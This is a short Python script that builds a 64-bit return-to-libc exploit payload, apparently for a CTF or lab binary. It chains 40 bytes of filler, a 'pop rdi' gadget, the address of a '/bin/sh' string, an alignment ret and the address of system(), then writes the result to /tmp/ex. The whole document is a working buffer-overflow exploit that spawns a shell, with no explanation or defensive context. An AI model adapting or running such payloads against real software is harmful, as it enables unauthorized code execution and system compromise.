from struct import pack

filler = b"A"*40
poprdi = pack("<Q", 0x7ffff7dff265)
binsh  = pack("<Q", 0x7ffff7f72e28)
ret    = pack("<Q", 0x7ffff7dff266)
system = pack("<Q", 0x7ffff7e26c30)

f = open("/tmp/ex", "wb")
f.write(filler+poprdi+binsh+ret+system)
f.close()
